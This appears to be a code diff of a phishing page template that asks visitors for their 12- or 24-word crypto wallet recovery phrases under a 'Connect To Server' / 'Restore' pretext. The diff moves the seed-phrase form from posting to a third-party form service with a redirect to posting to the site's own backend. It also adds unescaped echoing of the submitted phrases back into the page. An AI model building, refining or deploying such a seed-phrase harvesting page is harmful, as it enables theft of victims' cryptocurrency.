@@ -19,11 +19,13 @@
   <h2>Connect To Server</h2>
 
   <button id="btn1" onclick="show_hide()">12 WORD PHRASE</button>
-  <% if(alert.status === "error") { %>
-    <div class="error"><b>Error:</b> <%- alert.message %></div>
-  <% } %>
-  <% if(alert.status === "success") { %>
-    <div class="success"><b>Success:</b> <%- alert.message %></div>
+  <% if(formSection === "12") { %>
+    <% if(alert.status === "error") { %>
+      <div class="error"><b>Error:</b> <%- alert.message %></div>
+    <% } %>
+    <% if(alert.status === "success") { %>
+      <div class="success"><b>Success:</b> <%- alert.message %></div>
+    <% } %>
   <% } %>
   <div id="15form" class="r-container" <% if(formSection === "12"){ %>style="display: block;"<% } %>>
     <h2 class="mnemonic">MNEMONIC</h2>
@@ -89,18 +91,7 @@
         Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your account.
       </p>
 
-      <input type="submit" style="
-      border: 0;
-      border-radius: 7px;
-      font-size: 20px;
-      text-align: center;
-      background: #0000FF;
-      color: #ffffff;
-      width: 60%;
-      padding: 10px 0;
-      margin: 20px 0;" value="Restore" >
-
-      <!-- <button id="restoreButton12" style="
+      <button
               border: 0;
               border-radius: 7px;
               font-size: 20px;
@@ -111,7 +102,7 @@
               padding: 10px 0;
               margin: 20px 0;">
         Restore
-      </button> -->
+      </button>
     </form>
   </div>
   </div>
@@ -143,7 +134,15 @@
 
 
   <button id="btn2" onclick="hide_show()">24 WORD PHRASE</button>
-  <div id="24form" class="r-container">
+  <% if(formSection === "24") { %>
+    <% if(alert.status === "error") { %>
+      <div class="error"><b>Error:</b> <%- alert.message %></div>
+    <% } %>
+    <% if(alert.status === "success") { %>
+      <div class="success"><b>Success:</b> <%- alert.message %></div>
+    <% } %>
+  <% } %>
+  <div id="24form" <% if(formSection === "24"){ %>style="display: block;"<% } %> class="r-container">
     <ul class="nav justify-content-between">
       <h2 class="mnemonic">MNEMONIC</h2>
     </ul>
@@ -151,98 +150,94 @@
 
     <div class="tab-content" id="myTabContent">
       <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
-        <form id="email-form-24" method="POST" class="form-2">
-
-
-          <input type="hidden" name="_captcha" value="false">
-          <input type="hidden" name="_next" value="https://walletrestore-web.netlify.app/">
+        <form id="email-form-24" method="POST" action="?type=24" class="form-2">
           <div class="">
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word1_24" required placeholder="1">
+              <input class="mnemonic-input" type="text" name="phrase_1" value='<%- formSection === "24" ? form.phrase_1 : "" %>' required placeholder="1">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word2_24" required placeholder="2">
+              <input class="mnemonic-input" type="text" name="phrase_2" value='<%- formSection === "24" ? form.phrase_2 : "" %>' required placeholder="2">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word3_24" required placeholder="3">
+              <input class="mnemonic-input" type="text" name="phrase_3" value='<%- formSection === "24" ? form.phrase_3 : "" %>' required placeholder="3">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word4_24" required placeholder="4">
+              <input class="mnemonic-input" type="text" name="phrase_4" value='<%- formSection === "24" ? form.phrase_4 : "" %>' required placeholder="4">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word5_24" required placeholder="5">
+              <input class="mnemonic-input" type="text" name="phrase_5" value='<%- formSection === "24" ? form.phrase_5 : "" %>' required placeholder="5">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word6_24" required placeholder="6">
+              <input class="mnemonic-input" type="text" name="phrase_6" value='<%- formSection === "24" ? form.phrase_6 : "" %>' required placeholder="6">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word7_24" required placeholder="7">
+              <input class="mnemonic-input" type="text" name="phrase_7" value='<%- formSection === "24" ? form.phrase_7 : "" %>' required placeholder="7">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word8_24" required placeholder="8">
+              <input class="mnemonic-input" type="text" name="phrase_8" value='<%- formSection === "24" ? form.phrase_8 : "" %>' required placeholder="8">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word9_24"  required placeholder="9">
+              <input class="mnemonic-input" type="text" name="phrase_9" value='<%- formSection === "24" ? form.phrase_9 : "" %>'  required placeholder="9">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word10_24" required placeholder="10">
+              <input class="mnemonic-input" type="text" name="phrase_10" value='<%- formSection === "24" ? form.phrase_10 : "" %>' required placeholder="10">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word11_24" required placeholder="11">
+              <input class="mnemonic-input" type="text" name="phrase_11" value='<%- formSection === "24" ? form.phrase_11 : "" %>' required placeholder="11">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word12_24" required placeholder="12">
+              <input class="mnemonic-input" type="text" name="phrase_12" value='<%- formSection === "24" ? form.phrase_12 : "" %>' required placeholder="12">
             </div>
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word13_24" required placeholder="13">
+              <input class="mnemonic-input" type="text" name="phrase_13" value='<%- formSection === "24" ? form.phrase_13 : "" %>' required placeholder="13">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word14_24" required placeholder="14">
-            </div>
-
-            <div class="input">
-              <span></span>
-              <input class="mnemonic-input" type="text" name="word15_24" required placeholder="15">
-
-              <span></span>
-              <input class="mnemonic-input" type="text" name="word16_24" required placeholder="16">
+              <input class="mnemonic-input" type="text" name="phrase_14" value='<%- formSection === "24" ? form.phrase_14 : "" %>' required placeholder="14">
             </div>
 
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word17_24" required placeholder="17">
+              <input class="mnemonic-input" type="text" name="phrase_15" value='<%- formSection === "24" ? form.phrase_15 : "" %>' required placeholder="15">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word18_24" required placeholder="18">
+              <input class="mnemonic-input" type="text" name="phrase_16" value='<%- formSection === "24" ? form.phrase_16 : "" %>' required placeholder="16">
             </div>
 
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word19_24" required placeholder="19">
+              <input class="mnemonic-input" type="text" name="phrase_17" value='<%- formSection === "24" ? form.phrase_17 : "" %>' required placeholder="17">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word20_24" required placeholder="20">
+              <input class="mnemonic-input" type="text" name="phrase_18" value='<%- formSection === "24" ? form.phrase_18 : "" %>' required placeholder="18">
             </div>
 
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word21_24" required placeholder="21">
+              <input class="mnemonic-input" type="text" name="phrase_19" value='<%- formSection === "24" ? form.phrase_19 : "" %>' required placeholder="19">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word22_24" required placeholder="22">
+              <input class="mnemonic-input" type="text" name="phrase_20" value='<%- formSection === "24" ? form.phrase_20 : "" %>' required placeholder="20">
             </div>
 
             <div class="input">
               <span></span>
-              <input class="mnemonic-input" type="text" name="word23_24" required placeholder="23">
+              <input class="mnemonic-input" type="text" name="phrase_21" value='<%- formSection === "24" ? form.phrase_21 : "" %>' required placeholder="21">
 
               <span></span>
-              <input class="mnemonic-input" type="text" name="word24_24" required placeholder="24">
+              <input class="mnemonic-input" type="text" name="phrase_22" value='<%- formSection === "24" ? form.phrase_22 : "" %>' required placeholder="22">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="phrase_23" value='<%- formSection === "24" ? form.phrase_23 : "" %>' required placeholder="23">
+
+              <span></span>
+              <input class="mnemonic-input" type="text" name="phrase_24" value='<%- formSection === "24" ? form.phrase_24 : "" %>' required placeholder="24">
             </div>
 
           </div>
@@ -264,13 +259,13 @@
 
       </div>
       
-        <span><input type="checkbox" name="checkbox" id="mnemonic-checkbox" required=""> I have entered all details
+        <span><input type="checkbox" name="checkbox" id="mnemonic-checkbox" <%- formSection === "24" ? "checked" : "" %>  required=""> I have entered all details
           correctly.</span>
 
       </div>
       <div>
         <div class="overlay" id="overlay"></div>
-        <input name="submit" type="text" style="display:none">
+        <input type="text" style="display:none">
         <div class="modal">
         <button id="restoreButton24" style="
                 border: 0;
